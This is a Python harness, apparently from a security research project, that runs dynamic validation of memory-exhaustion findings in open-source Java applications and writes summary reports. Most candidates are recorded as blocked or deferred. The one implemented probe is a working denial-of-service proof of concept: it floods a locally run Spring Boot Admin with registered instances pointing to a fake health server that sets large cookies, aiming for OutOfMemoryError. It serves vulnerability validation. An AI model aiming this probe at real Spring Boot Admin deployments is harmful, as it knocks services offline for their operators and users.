#!/usr/bin/env python3
"""Run application-level P2 dynamic probes from the triage queue."""

from __future__ import annotations

import argparse
import csv
import dataclasses
import http.server
import json
import sys
import socket
import subprocess
import threading
import time
import urllib.error
import urllib.parse
from collections.abc import Callable
from pathlib import Path

import run_application_p0_dynamic_validation as p0
import run_application_p1_dynamic_validation as p1


BASE_DIR = p0.BASE_DIR
OUT_DIR = BASE_DIR / "results" / "applications_dynamic_validation" / "p2"
LOG_DIR = OUT_DIR / "logs"
RUNTIME_DIR = OUT_DIR / "runtime"
SOURCE_PLAN = (
    BASE_DIR
    / "results"
    / "applications_static_analysis"
    / "_static_validation"
    / "p2_dynamic_validation_triage.md"
)

# Keep imported helper output paths in the P2 tree.
p0.OUT_DIR = OUT_DIR
p0.LOG_DIR = LOG_DIR
p0.RUNTIME_DIR = RUNTIME_DIR
p1.OUT_DIR = OUT_DIR
p1.LOG_DIR = LOG_DIR
p1.RUNTIME_DIR = RUNTIME_DIR


@dataclasses.dataclass(frozen=True)
class Candidate:
    candidate_id: str
    app: str
    title: str
    triage_group: str
    runner: str | None = None
    blocked_reason: str = ""


ProbeResult = p0.ProbeResult


P2_CANDIDATES: tuple[Candidate, ...] = (
    Candidate(
        "SBA-APP-STATIC-0002",
        "codecentric__spring-boot-admin",
        "Registered endpoint Set-Cookie response grows per-instance CookieStore",
        "recommended_dynamic",
        "sba_cookie_store",
    ),
    Candidate(
        "ASTRON-AGENT-APP-STATIC-0002",
        "iflytek__astron-agent",
        "Embedding fileIds create ad hoc fixed thread pools and DB polling loops",
        "recommended_dynamic",
        None,
        "需要默认 console 后端、有效 JWT、space 和 owned file 前置；本轮未集成 Astron console/RAGFlow/DB 默认栈与低权限业务态初始化。",
    ),
    Candidate(
        "JETLINKS-APP-STATIC-0002",
        "jetlinks__jetlinks-community",
        "Public file thumbnail path joins image bytes before decode",
        "recommended_dynamic",
        None,
        "需要 JetLinks 默认全栈、登录/上传或种入 publicAccess 大图片；本轮未集成 Elasticsearch/Redis/R2DBC 等默认依赖和业务数据前置。",
    ),
    Candidate(
        "JETLINKS-APP-STATIC-0004",
        "jetlinks__jetlinks-community",
        "WebSocket /messaging subscriptions retain attacker-controlled ids",
        "recommended_dynamic",
        None,
        "需要 JetLinks 默认全栈、普通用户 token 和可用 WebSocket messaging topic；本轮未集成认证与默认业务态初始化。",
    ),
    Candidate(
        "MALL-APP-STATIC-0001",
        "macrozheng__mall",
        "mall-portal cancelOrder enqueues RabbitMQ TTL messages without per-user quota",
        "recommended_dynamic",
        None,
        "需要 mall-portal 默认 MySQL/Redis/RabbitMQ 栈、自注册 member、有效订单或可接受的 cancelOrder 业务前置；本轮未集成完整 compose 和订单态初始化。",
    ),
    Candidate(
        "KWV-APP-STATIC-0002",
        "sourcelaborg__kafka-webview",
        "WebSocket consumer manager can retain rejected consumer entries",
        "recommended_dynamic",
        None,
        "需要 Kafka WebView 默认登录态、Kafka 集群、valid view 和 WebSocket consume session；本轮未集成 dev-cluster 与 view 初始化。",
    ),
    Candidate(
        "KWV-APP-STATIC-0003",
        "sourcelaborg__kafka-webview",
        "ConsumeRequest and offsets JSON bodies materialize large object graphs",
        "recommended_dynamic",
        None,
        "需要 Kafka WebView 默认登录态、CSRF/valid view；本轮未集成登录和 view 初始化，不能把裸 JSON 解析探针视为默认可达。",
    ),
    Candidate(
        "RILL-FLOW-APP-STATIC-0001",
        "weibocom__rill-flow",
        "Default submit stores execution/context state in Redis",
        "recommended_dynamic",
        None,
        "需要默认 UI/API 创建最小可提交 descriptor；本轮未完成不改非默认配置的 descriptor 初始化子任务。",
    ),
    Candidate(
        "ELADMIN-APP-STATIC-0002",
        "elunez__eladmin",
        "Anonymous captcha writes small short-TTL Redis keys",
        "low_cost_observation",
        None,
        "P2 triage 仅建议低成本 Redis TTL baseline；TTL 2 分钟且元素小，不优先作为 OOM 动态验证主队列。",
    ),
    Candidate(
        "ELADMIN-APP-STATIC-0003",
        "elunez__eladmin",
        "Successful login retains online token keys",
        "low_cost_observation",
        None,
        "需要有效 captcha 和凭据；属于 active-token 观测，不作为本轮 OOM 主探针。",
    ),
    Candidate(
        "OPSLI-BOOT-APP-STATIC-0002",
        "hiparker__opsli-boot",
        "Anonymous captcha Redis key plus spoofable limiter dimension",
        "low_cost_observation",
        None,
        "TTL 300 秒且本地 limiter cache 有上限；已有更强 OPSLI WAF body P1 探针覆盖。",
    ),
    Candidate(
        "OPSLI-BOOT-APP-STATIC-0003",
        "hiparker__opsli-boot",
        "Email/mobile code writes Redis and may call external providers",
        "low_cost_observation",
        None,
        "默认 SMS/email secret 缺失应视为环境阻塞，不作为直接 OOM 动态验证。",
    ),
    Candidate(
        "MALL-APP-STATIC-0004",
        "macrozheng__mall",
        "Anonymous authCode Redis key",
        "low_cost_observation",
        None,
        "TTL 90 秒且 value 小；仅适合作为 mall Redis TTL baseline。",
    ),
    Candidate(
        "MALL-APP-STATIC-0005",
        "macrozheng__mall",
        "Member cache persists after register/login",
        "low_cost_observation",
        None,
        "需要区分 DB row 副作用和 Redis cache；本轮未作为 OOM 主探针。",
    ),
    Candidate(
        "MTINY-STATIC-0001",
        "macrozheng__mall-tiny",
        "Register/login triggers 24h admin cache",
        "low_cost_observation",
        None,
        "Redis 异常可能被 cache aspect 吞掉，服务不可用影响不稳定；仅建议低成本观测。",
    ),
    Candidate(
        "XXL-BOOT-APP-STATIC-0002",
        "xuxueli__xxl-boot",
        "Anonymous captcha Redis TTL key",
        "low_cost_observation",
        None,
        "已有 XXL-Boot P1/P0 更强路径覆盖；该短 TTL key 只做 baseline。",
    ),
    Candidate(
        "RYVF-APP-STATIC-0003",
        "yangzongzhuan__ruoyi-vue-fast",
        "Anonymous captcha Redis TTL key",
        "low_cost_observation",
        None,
        "已有 RYVF P0/P1 更强路径覆盖；该短 TTL key 只做 baseline。",
    ),
    Candidate(
        "RYVF-APP-STATIC-0005",
        "yangzongzhuan__ruoyi-vue-fast",
        "Successful login token TTL key",
        "low_cost_observation",
        None,
        "需要默认/低权限账号和 captcha；作为低优先级观测而非 OOM 主探针。",
    ),
    Candidate(
        "SMARTADMIN-STATIC-0003",
        "1024-lab__smart-admin",
        "Enterprise Excel export materializes workbook rows",
        "deferred",
        None,
        "需要业务权限和足够 DB 行；默认/demo 数据规模不足，主要是 request-local workbook 峰值。",
    ),
    Candidate(
        "SMARTADMIN-STATIC-0004",
        "1024-lab__smart-admin",
        "Goods import/export materializes workbook rows",
        "deferred",
        None,
        "需要商品权限和大量 DB rows；导入还受 multipart 10MB 约束。",
    ),
    Candidate(
        "NACOS-APP-STATIC-0003",
        "alibaba__nacos",
        "HTTP listen config path wiring not confirmed in current source",
        "deferred",
        None,
        "现有 3.x 源码 HTTP listen config path wiring 未证实，open API 注释倾向 gRPC listener。",
    ),
    Candidate(
        "SOCKETMQTT-APP-STATIC-0003",
        "daoshenzzg__socket-mqtt",
        "ProtocolDecoder example path",
        "deferred",
        None,
        "默认 MQTT/MQTT_WS server pipeline 使用 MQTT decoder；该自定义/normal socket handler 不是默认暴露路径。",
    ),
    Candidate(
        "ELADMIN-APP-STATIC-0001",
        "elunez__eladmin",
        "Image upload temp disk and local file storage",
        "deferred",
        None,
        "主资源是 servlet temp disk 和持久本地文件，且需要登录；不是 OOM 主资源。",
    ),
    Candidate(
        "ELADMIN-APP-STATIC-0005",
        "elunez__eladmin",
        "Code generator download temp zip storage",
        "deferred",
        None,
        "需要 generator config 和登录态，主资源为临时目录/zip 文件磁盘残留。",
    ),
    Candidate(
        "HALO-APP-STATIC-0002",
        "halo-dev__halo",
        "Plugin install temp jar storage",
        "deferred",
        None,
        "admin console 操作，主影响是 temp JAR disk/IO。",
    ),
    Candidate(
        "HALO-APP-STATIC-0003",
        "halo-dev__halo",
        "Theme ZIP unzip",
        "deferred",
        None,
        "admin-only，主资源为持久 workdir disk/file count。",
    ),
    Candidate(
        "HALO-APP-STATIC-0004",
        "halo-dev__halo",
        "Migration restore",
        "deferred",
        None,
        "admin-only 且破坏性恢复流程，主资源为磁盘/对象存储/DB。",
    ),
    Candidate(
        "ASTRON-AGENT-APP-STATIC-0001",
        "iflytek__astron-agent",
        "S3/MinIO presigned PUT object storage growth",
        "deferred",
        None,
        "对象存储磁盘增长，已标 not_oom_primary。",
    ),
    Candidate(
        "ASTRON-AGENT-APP-STATIC-0003",
        "iflytek__astron-agent",
        "create-html-file persistent DB/file_info rows",
        "deferred",
        None,
        "主资源为持久化 DB/file_info 行，默认 console/space 前置仍不足。",
    ),
    Candidate(
        "ASTRON-AGENT-STATIC-0004",
        "iflytek__astron-agent",
        "SSE emitter path",
        "deferred",
        None,
        "需要更多 key/gateway/默认 console 前置，优先级弱于 embedding 线程候选。",
    ),
    Candidate(
        "ASTRON-AGENT-STATIC-0005",
        "iflytek__astron-agent",
        "bot-debug MCP URL list",
        "deferred",
        None,
        "需要默认 gateway/tool enumeration 前置确认，暂不进入 OOM 队列。",
    ),
    Candidate(
        "POWERJOB-APP-STATIC-0001",
        "powerjob__powerjob",
        "OpenAPI persistent job metadata rows",
        "deferred",
        None,
        "主要是 persistent DB rows/job metadata；P0 已有 PowerJob body-cache OOM 强路径。",
    ),
    Candidate(
        "POWERJOB-APP-STATIC-0004",
        "powerjob__powerjob",
        "Container template temp disk churn",
        "deferred",
        None,
        "匿名 container template 生成是有界模板引发的 temp disk churn，已标 not_oom_primary。",
    ),
    Candidate(
        "SPMS-APP-STATIC-0002",
        "s-pms__spms-server",
        "Existing OpenApp Redis TTL key",
        "deferred",
        None,
        "需要登录和 existing OpenApp，Redis TTL 300 秒；默认空实例可达性不足。",
    ),
)


def rel(path: Path) -> str:
    return p0.rel(path)


def free_port() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind(("127.0.0.1", 0))
        return int(sock.getsockname()[1])


class CookieHealthHandler(http.server.BaseHTTPRequestHandler):
    server_version = "P2CookieHealth/1.0"

    def do_GET(self) -> None:  # noqa: N802 - BaseHTTPRequestHandler API
        self.server.request_count += 1  # type: ignore[attr-defined]
        parsed = urllib.parse.urlparse(self.path)
        suffix = parsed.path.rsplit("/", 1)[-1] or str(self.server.request_count)  # type: ignore[attr-defined]
        cookie_value = "C" * self.server.cookie_value_size  # type: ignore[attr-defined]
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        for idx in range(self.server.cookies_per_response):  # type: ignore[attr-defined]
            # JDK CookieManager rewrites Max-Age cookies as RFC2965 Version=1
            # Cookie headers. Spring Boot Admin splits those headers at the
            # first '=' and Reactor Netty then rejects the quoted value. A
            # simple Path cookie is retained and replayed as a valid header.
            self.send_header(
                "Set-Cookie",
                f"p2_{suffix}_{idx}={cookie_value}; Path=/",
            )
        self.end_headers()
        try:
            self.wfile.write(b'{"status":"UP"}')
        except (BrokenPipeError, ConnectionResetError):
            pass

    def log_message(self, format: str, *args: object) -> None:
        return


class QuietThreadingHTTPServer(http.server.ThreadingHTTPServer):
    def handle_error(self, request, client_address) -> None:
        exc_type = sys.exc_info()[0]
        if exc_type in {BrokenPipeError, ConnectionResetError}:
            return
        super().handle_error(request, client_address)


def start_cookie_health_server(
    port: int,
    cookie_value_size: int,
    cookies_per_response: int,
) -> http.server.ThreadingHTTPServer:
    server = QuietThreadingHTTPServer(("127.0.0.1", port), CookieHealthHandler)
    server.request_count = 0  # type: ignore[attr-defined]
    server.cookie_value_size = cookie_value_size  # type: ignore[attr-defined]
    server.cookies_per_response = cookies_per_response  # type: ignore[attr-defined]
    thread = threading.Thread(target=server.serve_forever, name="p2-cookie-health", daemon=True)
    thread.start()
    return server


def register_sba_cookie_instance(port: int, attacker_port: int, index: int) -> int:
    payload = {
        "name": "p2-cookie",
        "managementUrl": f"http://127.0.0.1:{attacker_port}/actuator/{index}",
        "healthUrl": f"http://127.0.0.1:{attacker_port}/actuator/health/{index}",
        "serviceUrl": f"http://127.0.0.1:{attacker_port}/service/{index}",
        "metadata": {
            "p2": str(index),
            "pad": "K" * 256,
        },
    }
    status, _, _ = p0.http_request(
        f"http://127.0.0.1:{port}/instances",
        method="POST",
        data=json.dumps(payload).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        timeout=8,
    )
    return status


def wait_for_cookie_hits(
    server: http.server.ThreadingHTTPServer,
    process,
    log_path: Path,
    min_hits: int,
    timeout: float,
) -> None:
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        if process.poll() is not None or p0.oom_signal(log_path):
            return
        if int(getattr(server, "request_count", 0)) >= min_hits:
            return
        time.sleep(0.5)


def start_sba_quiet(case: Candidate, heap: str, port: int) -> tuple[subprocess.Popen[bytes], object, Path]:
    command = p0.spring_boot_command(
        heap,
        p1.sba_classpath(),
        "de.codecentric.boot.admin.sample.SpringBootAdminServletApplication",
        f"--server.port={port}",
        "--spring.profiles.active=insecure",
        "--spring.boot.admin.client.enabled=false",
        "--spring.cloud.config.enabled=false",
        "--spring.config.import=",
        "--spring.main.lazy-initialization=true",
        "--logging.level.root=WARN",
        "--logging.level.de.codecentric.boot.admin=ERROR",
        "--logging.level.reactor.netty=ERROR",
        java_preferred=("java-17-openjdk", "java-21-openjdk", "java-22-openjdk"),
    )
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    sample = p1.SBA_DIR / "spring-boot-admin-samples" / "spring-boot-admin-sample-servlet"
    process, handle = p0.start_java(command, log_path, sample)
    if not p0.wait_for_http(f"http://127.0.0.1:{port}/instances", 150, process):
        p0.stop_process(process, handle)
        raise RuntimeError(f"Spring Boot Admin did not serve /instances on port {port}; see {rel(log_path)}")
    return process, handle, log_path


def finish_probe(
    case: Candidate,
    process,
    handle,
    log_path: Path,
    requests_sent: int,
    evidence: dict[str, object],
    notes: str,
) -> ProbeResult:
    p0_case = p0.Candidate(case.candidate_id, case.app, case.title, case.runner, case.blocked_reason)
    return p0.finish_probe(p0_case, process, handle, log_path, requests_sent, evidence, notes)


def run_sba_cookie_store(case: Candidate) -> ProbeResult:
    port = free_port()
    attacker_port = free_port()
    heap = "128m"
    cookie_value_size = 4096
    cookies_per_response = 1
    max_instances = 15000
    server = start_cookie_health_server(attacker_port, cookie_value_size, cookies_per_response)
    process = None
    handle = None
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    sent = 0
    last_status = 0
    client_exception = ""
    try:
        process, handle, log_path = start_sba_quiet(case, heap, port)
        for index in range(1, max_instances + 1):
            last_status = register_sba_cookie_instance(port, attacker_port, index)
            sent = index
            if index % 500 == 0:
                time.sleep(0.5)
                if process.poll() is not None or p0.oom_signal(log_path):
                    break
    except (urllib.error.URLError, TimeoutError, OSError, Exception) as exc:
        client_exception = repr(exc)
    finally:
        try:
            server.shutdown()
            server.server_close()
        except OSError:
            pass
    if process is None or handle is None:
        return error_result(case, RuntimeError(client_exception or "Spring Boot Admin did not start"))
    wait_for_cookie_hits(server, process, log_path, min(sent, 5000), 30)
    return finish_probe(
        case,
        process,
        handle,
        log_path,
        sent,
        {
            "heap": heap,
            "port": port,
            "attackerPort": attacker_port,
            "endpoint": "POST /instances -> status updater GET healthUrl",
            "maxInstances": max_instances,
            "cookieValueSize": cookie_value_size,
            "cookiesPerResponse": cookies_per_response,
            "cookieHealthRequests": int(getattr(server, "request_count", 0)),
            "lastHttpStatus": last_status,
            "clientException": client_exception,
            "postProbePortOpen": p0.port_open(port),
        },
        notes="最小 insecure SBA sample，注册唯一实例指向本地攻击者 healthUrl，由默认 status updater 接收 Set-Cookie 并写入 per-instance JDK CookieStore；只有目标 JVM OOM 才提升为真阳性。",
    )


RUNNERS: dict[str, Callable[[Candidate], ProbeResult]] = {
    "sba_cookie_store": run_sba_cookie_store,
}


def blocked_result(case: Candidate) -> ProbeResult:
    status = "triage_not_selected" if case.triage_group != "recommended_dynamic" else "precondition_blocked"
    return ProbeResult(
        candidate_id=case.candidate_id,
        app=case.app,
        title=case.title,
        status=status,
        dynamic_verdict="not_run",
        true_positive=False,
        oom_signal="",
        requests_sent=0,
        heap="",
        log="",
        evidence={
            "triageGroup": case.triage_group,
            "blockedReason": case.blocked_reason,
            "sourcePlan": rel(SOURCE_PLAN),
        },
        notes=case.blocked_reason,
    )


def error_result(case: Candidate, exc: Exception) -> ProbeResult:
    return ProbeResult(
        candidate_id=case.candidate_id,
        app=case.app,
        title=case.title,
        status="probe_error",
        dynamic_verdict="not_confirmed",
        true_positive=False,
        oom_signal="",
        requests_sent=0,
        heap="",
        log="",
        evidence={"exception": repr(exc), "triageGroup": case.triage_group},
        notes=str(exc),
    )


def result_to_dict(result: ProbeResult) -> dict[str, object]:
    return dataclasses.asdict(result)


def load_existing_results() -> list[ProbeResult]:
    path = OUT_DIR / "summary.json"
    if not path.exists():
        return []
    rows = json.loads(path.read_text(encoding="utf-8"))
    return [ProbeResult(**row) for row in rows]


def merge_results(existing: list[ProbeResult], updates: list[ProbeResult]) -> list[ProbeResult]:
    by_id = {result.candidate_id: result for result in existing}
    by_id.update({result.candidate_id: result for result in updates})
    ordered: list[ProbeResult] = []
    seen: set[str] = set()
    for case in P2_CANDIDATES:
        result = by_id.get(case.candidate_id)
        if result is not None:
            ordered.append(result)
            seen.add(case.candidate_id)
    for result in existing + updates:
        if result.candidate_id not in seen:
            ordered.append(result)
            seen.add(result.candidate_id)
    return ordered


def render_report(results: list[ProbeResult]) -> str:
    verified_oom = [result for result in results if result.status == "verified_oom"]
    verified_unavailable = [result for result in results if result.status == "verified_service_unavailable"]
    completed = [result for result in results if result.status == "completed_without_oom"]
    blocked = [result for result in results if result.status == "precondition_blocked"]
    not_selected = [result for result in results if result.status == "triage_not_selected"]
    errors = [result for result in results if result.status == "probe_error"]
    process_exited = [result for result in results if result.status == "process_exited_without_oom"]
    recommended = [result for result in results if next((c for c in P2_CANDIDATES if c.candidate_id == result.candidate_id), None) and next(c for c in P2_CANDIDATES if c.candidate_id == result.candidate_id).triage_group == "recommended_dynamic"]
    lines = [
        "# P2 应用级动态验证结果",
        "",
        f"- 生成时间：{time.strftime('%Y-%m-%d %H:%M:%S')}",
        f"- 输入清单：`{rel(SOURCE_PLAN)}`",
        f"- 输出目录：`{rel(OUT_DIR)}/`",
        "- 真阳性门槛：必须由真实外部协议/HTTP 请求触发目标 JVM `OutOfMemoryError`、GC death、线程/连接池耗尽或持续服务不可用；短期增长曲线、Redis key 数增长、broker backlog 或环境缺口不提升为真阳性。",
        "",
        "## 总览",
        "",
        f"- P2 候选总数：{len(results)}",
        f"- triage 建议进入动态验证：{len(recommended)}",
        f"- 已真实触发 OOM 真阳性：{len(verified_oom)}",
        f"- 已确认持续服务不可用：{len(verified_unavailable)}",
        f"- 已执行但未确认 OOM/不可用：{len(completed)}",
        f"- 进程退出但无 OOM 证据：{len(process_exited)}",
        f"- 探针错误：{len(errors)}",
        f"- 默认环境/业务前置阻塞：{len(blocked)}",
        f"- triage 未选入主动态队列：{len(not_selected)}",
        "",
        "## 逐项结果",
        "",
        "| candidate | app | status | true_positive | oom_signal | requests | log |",
        "| --- | --- | --- | --- | --- | --- | --- |",
    ]
    for result in results:
        log = f"`{result.log}`" if result.log else ""
        signal = result.oom_signal or ""
        lines.append(
            f"| `{result.candidate_id}` | `{result.app}` | `{result.status}` | "
            f"{str(result.true_positive).lower()} | `{signal}` | {result.requests_sent} | {log} |"
        )
    lines.extend(["", "## 真阳性", ""])
    if verified_oom or verified_unavailable:
        for result in [*verified_oom, *verified_unavailable]:
            lines.extend(
                [
                    f"### `{result.candidate_id}`",
                    "",
                    f"- 应用：`{result.app}`",
                    f"- 结论：`{result.dynamic_verdict}`",
                    f"- OOM 信号：`{result.oom_signal}`",
                    f"- 请求数：{result.requests_sent}",
                    f"- 堆限制：`{result.heap}`",
                    f"- 原始日志：`{result.log}`",
                    f"- 证据：`{json.dumps(result.evidence, ensure_ascii=False)}`",
                    "",
                ]
            )
    else:
        lines.extend(["本轮没有候选达到真实 OOM 或持续服务不可用真阳性门槛。", ""])
    if completed:
        lines.extend(["## 已执行但未确认", ""])
        for result in completed:
            lines.append(f"- `{result.candidate_id}`：请求数 {result.requests_sent}；日志 `{result.log}`；{result.notes}")
        lines.append("")
    if process_exited:
        lines.extend(["## 进程退出但无 OOM 证据", ""])
        for result in process_exited:
            lines.append(f"- `{result.candidate_id}`：请求数 {result.requests_sent}；日志 `{result.log}`；{result.notes}")
        lines.append("")
    if errors:
        lines.extend(["## 探针错误", ""])
        for result in errors:
            lines.append(f"- `{result.candidate_id}`：{result.notes}")
        lines.append("")
    if blocked:
        lines.extend(["## 前置条件阻塞", ""])
        for result in blocked:
            lines.append(f"- `{result.candidate_id}`：{result.notes}")
        lines.append("")
    if not_selected:
        lines.extend(["## triage 未选入主动态队列", ""])
        for result in not_selected:
            lines.append(f"- `{result.candidate_id}`：{result.notes}")
        lines.append("")
    return "\n".join(lines)


def write_results(results: list[ProbeResult]) -> None:
    OUT_DIR.mkdir(parents=True, exist_ok=True)
    LOG_DIR.mkdir(parents=True, exist_ok=True)
    RUNTIME_DIR.mkdir(parents=True, exist_ok=True)
    rows = [result_to_dict(result) for result in results]
    (OUT_DIR / "summary.json").write_text(json.dumps(rows, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
    with (OUT_DIR / "findings.jsonl").open("w", encoding="utf-8") as handle:
        for row in rows:
            handle.write(json.dumps(row, ensure_ascii=False) + "\n")
    with (OUT_DIR / "summary.csv").open("w", encoding="utf-8", newline="") as handle:
        fieldnames = [
            "candidate_id",
            "app",
            "status",
            "dynamic_verdict",
            "true_positive",
            "oom_signal",
            "requests_sent",
            "heap",
            "log",
            "notes",
        ]
        writer = csv.DictWriter(handle, fieldnames=fieldnames)
        writer.writeheader()
        for result in results:
            writer.writerow({field: getattr(result, field) for field in fieldnames})
    (OUT_DIR / "P2_DYNAMIC_VALIDATION_REPORT.md").write_text(render_report(results), encoding="utf-8")


def selected_candidates(
    case_ids: list[str],
    runnable_only: bool = False,
    recommended_only: bool = False,
) -> list[Candidate]:
    candidates = list(P2_CANDIDATES)
    if recommended_only:
        candidates = [case for case in candidates if case.triage_group == "recommended_dynamic"]
    if runnable_only:
        candidates = [case for case in candidates if case.runner is not None]
    if not case_ids:
        return candidates
    by_id = {case.candidate_id: case for case in P2_CANDIDATES}
    missing = sorted(set(case_ids) - set(by_id))
    if missing:
        raise ValueError(f"unknown P2 candidate(s): {', '.join(missing)}")
    selected = [by_id[case_id] for case_id in case_ids]
    if recommended_only:
        selected = [case for case in selected if case.triage_group == "recommended_dynamic"]
    if runnable_only:
        selected = [case for case in selected if case.runner is not None]
    return selected


def run_candidates(candidates: list[Candidate], base_results: list[ProbeResult] | None = None) -> list[ProbeResult]:
    updates: list[ProbeResult] = []
    for case in candidates:
        print(f"== {case.candidate_id} {case.app}")
        if case.runner is None:
            result = blocked_result(case)
        else:
            try:
                result = RUNNERS[case.runner](case)
            except Exception as exc:
                result = error_result(case, exc)
        print(f"{case.candidate_id}: {result.status} {result.oom_signal}")
        updates.append(result)
        if base_results is None:
            write_results(updates)
        else:
            write_results(merge_results(base_results, updates))
    return updates if base_results is None else merge_results(base_results, updates)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--case", action="append", default=[], help="P2 candidate id to run; defaults to all")
    parser.add_argument("--recommended-only", action="store_true", help="run only the P2 candidates selected by triage")
    parser.add_argument("--runnable-only", action="store_true", help="run only currently implemented P2 probes")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    OUT_DIR.mkdir(parents=True, exist_ok=True)
    LOG_DIR.mkdir(parents=True, exist_ok=True)
    RUNTIME_DIR.mkdir(parents=True, exist_ok=True)
    try:
        candidates = selected_candidates(
            args.case,
            runnable_only=args.runnable_only,
            recommended_only=args.recommended_only,
        )
        base_results = load_existing_results() if args.case or args.runnable_only or args.recommended_only else None
        results = run_candidates(candidates, base_results=base_results)
    except Exception as exc:
        print(f"application P2 dynamic validation failed: {exc}", file=p0.sys.stderr)
        return 1
    verified_oom = sum(1 for result in results if result.status == "verified_oom")
    verified_unavailable = sum(1 for result in results if result.status == "verified_service_unavailable")
    print(
        f"wrote {rel(OUT_DIR / 'summary.json')} "
        f"verified_oom={verified_oom} verified_service_unavailable={verified_unavailable}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
